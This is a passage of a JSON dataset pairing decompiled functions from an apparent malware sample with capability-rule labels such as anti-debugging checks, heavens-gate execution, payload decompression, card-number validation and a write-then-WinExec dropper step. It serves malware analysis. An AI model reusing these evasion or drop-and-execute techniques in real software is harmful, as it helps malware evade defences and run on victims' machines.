arg_10h);\n        iVar2 = fcn.00404930(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x411190, &lpBuffer, arg_8h);\n            iVar2 = fcn.00404930(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x411190, &lpBuffer, arg_ch);\n                iVar2 = fcn.00404930(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004030d0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 610
    },
    "00404740": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004047a3) overlaps instruction at (ram,0x004047a2)\n// \n// WARNING: Removing unreachable block (ram,0x004047a3)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404740(uint32_t **arg_8h)\n\n{\n    uint32_t *puVar1;\n    uchar *puVar2;\n    uchar *puVar3;\n    uint32_t *in_EAX;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint8_t in_CL;\n    uint32_t uVar6;\n    uint32_t in_EDX;\n    uint32_t *unaff_EBX;\n    uint32_t *unaff_ESI;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    uint32_t **ppuVar9;\n    char *pcVar10;\n    uint32_t **ppuVar11;\n    uint16_t in_ES;\n    bool bVar12;\n    bool bVar13;\n    bool bVar14;\n    ulong uVar15;\n    uchar auStackY272 [204];\n    uint32_t *puStackY68;\n    uint32_t *puStackY64;\n    uchar *puStackY60;\n    uchar *puStackY56;\n    uint32_t *puStackY52;\n    uint uStackY48;\n    uint uStackY44;\n    uint32_t uStackY36;\n    uint var_8h;\n    uint32_t *var_4h;\n    \n    if ((0x7 < &stack0xfffffffc) && (0x7 >= &stack0xfffffffc)) {\n        if (*in_EAX <= &stack0xffffffe8 && in_EAX != 0xffffffff) {\n            uStackY36 = 0x40472a;\n            fcn.00402440(&stack0xfffffef0, 0xffffffff);\n            return 1;\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    ppuVar9 = arg_8h;\n    if ((0x5a4c < *arg_8h) && (*arg_8h < 0x5a4d)) {\n        out(0xc4, in_EAX);\n        uStackY36 = in_EDX & 0xffffff00 | in_EDX ^ in_CL;\n        ppuVar9 = arg_8h + 1;\n        *arg_8h = in_EAX;\n    }\n    piVar4 = ppuVar9[0xf] + ppuVar9;\n    // WARNING: Bad instruction - Truncating control flow here\n    if (*piVar4 != 0x4550) {\n        return 0;\n    }\n    if ((0x454f < *piVar4) && (*piVar4 < 0x4550)) {\n        uStackY36 = uStackY36 & 0xffff0000 | in_ES;\n        unaff_ESI = unaff_ESI + -1;\n        pcVar10 = ppuVar9 | &stack0xfffffffc;\n        ppuVar9 = pcVar10 + 1;\n        *pcVar10 = piVar4;\n        piVar4 = piVar4 & 0xffff0000 | piVar4 + (piVar4 >> 8) * 'y';\n    }\n    if (piVar4[0x16] != 0) {\n        return 0;\n    }\n    var_4h = 0x40;\n    if (ppuVar9[0xf] < 0x81) {\n        return 0;\n    }\n    puVar8 = ppuVar9[0xf];\n    if (puVar8 < 0xc0) {\n        puVar8 = puVar8 + -0x20;\n        var_4h = puVar8;\n    }\n    while( true ) {\n        uStackY44 = 0x404879;\n        uVar15 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n        puVar1 = _sym.imp.MSVCRT.dll_rand;\n        uStackY48 = uVar15 >> 0x20;\n        ppuVar9 = uVar15;\n        if (ppuVar9 == NULL) {\n            return 0;\n        }\n        puVar7 = NULL;\n        bVar12 = false;\n        bVar14 = false;\n        bVar13 = var_4h == NULL;\n        puStackY68 = puVar8;\n        puStackY64 = unaff_ESI;\n        puStackY60 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        puStackY56 = &stack0xffffffdc;\n        puVar3 = &stack0xffffffdc;\n        puStackY52 = unaff_EBX;\n        if (bVar13) break;\n        while ((puStackY56 = puVar3,  puStackY60 = puVar2,  bVar12 || bVar13 || (!bVar12 && !bVar13))) {\n            iVar5 = (*puVar1)();\n            puVar8 = puVar7 + 1;\n            bVar12 = puVar8 < var_4h;\n            bVar14 = SBORROW4(puVar8, var_4h);\n            bVar13 = puVar8 == var_4h;\n            *(puVar7 + ppuVar9) = iVar5 % 0xff;\n            puVar7 = puVar8;\n            puVar2 = puStackY60;\n            puVar3 = puStackY56;\n            if (!bVar12) goto code_r0x004048d8;\n        }\n        unaff_EBX = var_4h;\n        unaff_ESI = puVar7;\n        puVar8 = puVar1;\n        if (!bVar14) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\ncode_r0x004048d8:\n    ppuVar11 = arg_8h + 0x20;\n    for (uVar6 = var_4h >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *ppuVar11 = *ppuVar9;\n        ppuVar9 = ppuVar9 + 1;\n        ppuVar11 = ppuVar11 + 1;\n    }\n    for (uVar6 = var_4h & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *ppuVar11 = *ppuVar9;\n        ppuVar9 = ppuVar9 + 1;\n        ppuVar11 = ppuVar11 + 1;\n    }\n    uStackY44 = 0x40491e;\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n    return 1;\n}\n",
        "token_count": 1552
    },
    "00404220": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404220(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42161c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004030d0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x411444, acStack1304, &uStack2112);\n    uStack2088 = 0x4114cc;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4114e4;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401370(auStack1564, 0x411440, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1866
    },
    "004025c0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e",
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004026d5) overlaps instruction at (ram,0x004026d2)\n// \n// WARNING: Removing unreachable block (ram,0x00402628)\n// WARNING: Removing unreachable block (ram,0x0040268f)\n// WARNING: Removing unreachable block (ram,0x0040265e)\n// WARNING: Removing unreachable block (ram,0x004026a0)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.004025c0(uchar *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint32_t *puVar2;\n    uint32_t in_EAX;\n    uint16_t in_CX;\n    uint16_t uVar3;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint uVar4;\n    uint32_t in_EDX;\n    uint32_t unaff_EBX;\n    uchar *puVar5;\n    uint32_t unaff_EDI;\n    ushort in_ES;\n    ushort in_SS;\n    bool bVar6;\n    bool bVar7;\n    uchar auStack40 [8];\n    ushort uStack18;\n    ushort uVar8;\n    uint32_t uVar9;\n    uchar *puStack12;\n    \n    do {\n        uVar3 = in_EDX - 1U & in_CX;\n        bVar7 = uVar3 == 0;\n        bVar6 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n        *arg_8h = 0x14;\n        uVar9 = unaff_EDI;\n        if ((!bVar6) && (bVar6)) {\n            puVar1 = segment(in_SS, *0x10 + -0x10);\n            in_EDX = 0xb7bc9ea5;\n            if (bVar6) {\n                puStack12 = auStack40;\n                (*_sym.imp.KERNEL32.dll_SetFileTime)();\n                uVar4 = extraout_EDX;\n                if (unaff_EDI == 0xffffffff) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                    uVar4 = extraout_EDX_00;\n                }\n                return CONCAT44(uVar4, 1);\n            }\n            bVar7 = *0x10 == 0xc;\n            bVar6 = (POPCOUNT(&puStack12 & 0xff) & 1U) == 0;\n            in_EAX = *puVar1;\n            uVar9 = 0xb7bc9ea5;\n        }\n        uVar8 = uVar9;\n        arg_8h[1] = 0x20;\n        if ((!bVar7) && (bVar7)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        arg_8h[2] = 0xd6;\n        if ((bVar6) || (!bVar6)) goto code_r0x0040263d;\n        puVar2 = segment(in_SS, *0x10 + -0x10);\n        in_EAX = *puVar2;\n        in_EDX = 0xb7bc9ea5;\n    } while (bVar6);\n    in_EAX = in_EAX;\n    uVar8 = 0x9ea5;\ncode_r0x0040263d:\n    arg_8h[3] = 0x55;\n    arg_8h[4] = 0x67;\n    bVar6 = -1 < (in_EDX - 1U & in_CX);\n    arg_8h[5] = 0x33;\n    puVar5 = arg_8h;\n    if ((bVar6) && (!bVar6)) {\n        puVar5 = arg_8h + -1;\n        *(unaff_EDI | &stack0xfffffffc) = in_EAX;\n        in_EDX = in_EDX & 0xffffff00;\n        in_EAX = in_EAX & 0xffff0000 | in_EAX + (in_EAX >> 8) * 'y';\n        in_SS = uVar8;\n        uVar8 = in_ES;\n    }\n    puVar5[6] = 0xb5;\n    puVar5[7] = 0xae;\n    uStack18 = in_EAX >> 0x10;\n    bVar6 = (in_EDX & 0x1200) == 0;\n    arg_8h[8] = 0xbb;\n    if ((bVar6) || (!bVar6)) {\n        arg_8h[9] = 0x58;\n        uVar8 = uStack18;\n    }\n    uStack18 = uVar8;\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | unaff_EBX;\n    *(CONCAT22(uStack18, in_SS) + 10) = 0x21;\n    *(CONCAT22(uStack18, in_SS) + 0xb) = 0x1c;\n    *arg_ch = 0xc;\n    return CONCAT44(in_EDX, arg_ch);\n}\n",
        "token_count": 1145
    },
    "00402b30": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402bc7) overlaps instruction at (ram,0x00402bc3)\n// \n// WARNING: Removing unreachable block (ram,0x00402b7b)\n\nvoid __thiscall fcn.00402b30(int32_t param_1, int32_t *param_2, char *param_3)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uchar *unaff_EBX;\n    uchar *puVar5;\n    int32_t unaff_ESI;\n    int32_t *piVar6;\n    int32_t *unaff_EDI;\n    uchar uVar7;\n    bool bVar8;\n    uchar uVar9;\n    char cVar10;\n    char cVar11;\n    unkbyte10 extraout_ST0;\n    ulong uVar12;\n    \n    puVar5 = &stack0xfffffffc;\n    if ((0x7 < &stack0xfffffffc) && (puVar5 = &stack0xfffffffc,  0x7 >= &stack0xfffffffc)) {\n        if (param_1 != 1 && *0x10 == 0xc) {\n            return;\n        }\n        *unaff_EDI = unaff_ESI + 4;\n        uVar1 = *0x9750e2b5 | 0x8b;\n        param_3 = *0x9750e2b5 | 0x8b;\n        puVar5 = &stack0xfffffffd;\n        param_2 = unaff_EDI;\n        if (-1 < uVar1) {\n            uVar1 = uVar1 - 0x20;\n            param_3 = *0x9750e2b5 & 0xffffff00 | uVar1;\n            *param_3 = *param_3 + uVar1;\n        }\n    }\n    uVar2 = fcn.00404b80(0, param_2, param_3 + 1 >> 1);\n    piVar6 = uVar2 & 0xffff;\n    uVar7 = 0;\n    cVar11 = '\\0';\n    cVar10 = '\\0';\n    uVar9 = piVar6 == NULL;\n    *(puVar5 + 8) = piVar6;\n    uVar12 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    puVar3 = uVar12 >> 0x20;\n    iVar4 = uVar12;\n    *(puVar5 + -8) = iVar4;\n    if ((cVar11 == cVar10) && (cVar11 != cVar10)) {\n        *(iVar4 + -0x7ce92414) = extraout_ST0;\n        uVar7 = 0xbf74207b < *puVar3;\n        *puVar3 = *puVar3 + 0x408bdf84;\n        uVar9 = *puVar3 == 0;\n    }\n    else {\n        unaff_EBX = *(iVar4 + 0x58);\n    }\n    *(puVar5 + -4) = unaff_EBX;\n    if ((uVar7 || uVar9) || (!uVar7 && !uVar9)) {\n        bVar8 = piVar6 < unaff_EBX;\n    }\n    else {\n        *param_2 = *piVar6;\n        puVar5 = 0x66e181d0;\n        bVar8 = piVar6 + 1 < &stack0xffffffe4;\n        unaff_EBX = &stack0xffffffe4;\n        piVar6 = piVar6 + 1;\n    }\n    if (bVar8) {\n        *(puVar5 + 8) = (*(puVar5 + 8) - *(puVar5 + -4) & 0xffffU) - 1;\n    }\n    else {\n        *(puVar5 + 8) = piVar6 - (unaff_EBX & 0xffff);\n    }\n    iVar4 = *(puVar5 + 8);\n    uVar2 = *(puVar5 + -4) >> 0x10;\n    if (iVar4 < *(puVar5 + -4) >> 0x10) {\n        iVar4 = (iVar4 - uVar2 & 0xffff) - 1;\n    }\n    else {\n        iVar4 = iVar4 - uVar2;\n    }\n    *(puVar5 + 8) = iVar4;\n    **(puVar5 + 0x14) = *(puVar5 + 8) + *(puVar5 + 0xc);\n    **(puVar5 + 0x10) = *(*(puVar5 + -8) + 0x58);\n    return;\n}\n",
        "token_count": 1047
    },
    "00404a10": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404bb7) overlaps instruction at (ram,0x00404bb3)\n// \n// WARNING: Removing unreachable block (ram,0x00404bdb)\n\nuint32_t __cdecl fcn.00404a10(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uchar uVar1;\n    code *pcVar2;\n    int32_t in_EAX;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t extraout_ECX;\n    char cVar6;\n    uchar *puVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    int32_t *piVar10;\n    uint *puVar11;\n    bool bVar12;\n    bool bVar13;\n    bool bVar14;\n    ulong uVar15;\n    uchar var_20h;\n    uint var_1fh;\n    uint uStack8;\n    \n    puVar9 = &stack0xfffffffc;\n    bVar12 = &stack0xfffffffc < 0x20;\n    if ((!bVar12 && *0x10 != 0x24) && (bVar12 || *0x10 == 0x24)) {\n        if (SBORROW4(&stack0xfffffffc, 0x20)) {\n            return sym.imp.SHLWAPI.dll_SHSetValueA + bVar12 + in_EAX == NULL;\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    puVar3 = fcn.004012f0(arg_18h, arg_1ch, 0x4111b4, 7);\n    pcVar2 = _sym.imp.MSVCRT.dll_rand;\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    var_20h = 0;\n    puVar11 = &var_1fh;\n    for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    *puVar11 = 0;\n    *(puVar11 + 2) = 0;\n    uVar8 = 0;\n    do {\n        uVar4 = (*pcVar2)();\n        uVar4 = uVar4 & 0x800000ff;\n        if (uVar4 < 0) {\n            uVar4 = (uVar4 - 1 | 0xffffff00) + 1;\n        }\n        (&var_20h)[uVar8] = uVar4;\n        uVar8 = uVar8 + 1;\n    } while (uVar8 < 0x20);\n    puVar7 = &stack0xfffffffc;\n    if ((uVar8 != 0x20) && (puVar7 = &stack0xfffffffc,  uVar8 == 0x20)) {\n        puVar11 = &stack0xffffffcc;\n        puVar7 = &stack0xffffffcc;\n        cVar6 = '\\x10';\n        do {\n            puVar9 = puVar9 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *puVar9;\n            cVar6 = cVar6 + -1;\n        } while ('\\0' < cVar6);\n    }\n    puVar9 = puVar7 + -0x20;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar3 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    bVar12 = false;\n    bVar14 = false;\n    bVar13 = ((uVar4 >> 8) + 1U & 0x27) == 0;\n    uVar15 = fcn.00402900(*(puVar7 + 8), *(puVar7 + 0xc), *(puVar7 + 0x10), *(puVar7 + 0x14), puVar7 + -0x20, 0x20);\n    cVar6 = uVar15 >> 0x20;\n    if ((bVar14) || (!bVar14)) {\n        uVar8 = *(puVar7 + 0x1c);\n        cVar6 = *(puVar7 + 0x18);\n    }\n    else {\n        uVar1 = in(uVar15 >> 0x20);\n        *puVar3 = uVar1;\n        uVar8 = extraout_ECX;\n        if (!bVar12 && !bVar13) {\n            do {\n                if (uVar15 >> 0x10 != 0) {\n                    uVar8 = (uVar15 >> 0x10) + (uVar8 & 0xffff);\n                }\n                bVar12 = 0xfffffffd < uVar15 >> 0x20;\n                piVar10 = puVar9 + -1;\n                while( true ) {\n                    if (piVar10 == NULL) {\n                        return (uVar8 >> 0x10) + uVar8;\n                    }\n                    if (((bVar12) || (!bVar12)) || (uVar8 = uVar8 - 1,  uVar8 == 0 || piVar10 != NULL)) break;\n                    piVar10 = *(puVar7 + 0x10);\n                    bVar12 = false;\n                }\n                iVar5 = *piVar10;\n                *(puVar3 + 1) = piVar10 + 1;\n                puVar9 = 0x33b8ec44;\n                *0x33b8ebcf = *0x33b8ebcf << 2;\n                uVar8 = uVar8 + *0x9750e2b5;\n                uVar15 = CONCAT44(iVar5 >> 0x1f, uVar8);\n            } while( true );\n        }\n    }\n    *(uVar8 + 0x52) = (*(uVar8 + 0x52) - cVar6) - bVar12;\n    fcn.00404180(puVar7, 0x56);\n    return 1;\n}\n",
        "token_count": 1414
    },
    "004045a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004045a0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.004016a0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x4115f0;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 220
    },
    "00401ba0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00401ba0(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405100;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x411558);\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x411564);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, &lpdwResult);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x411578);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(lpdwResult, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar4 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00401fdb:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x00401fe7:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x00401fa2:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x00401fe7;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00401dde:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.004019b0(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x41158c);\n                        if (iVar1 != 0) goto joined_r0x00401dde;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00401f87:\n                            if (var_10h != 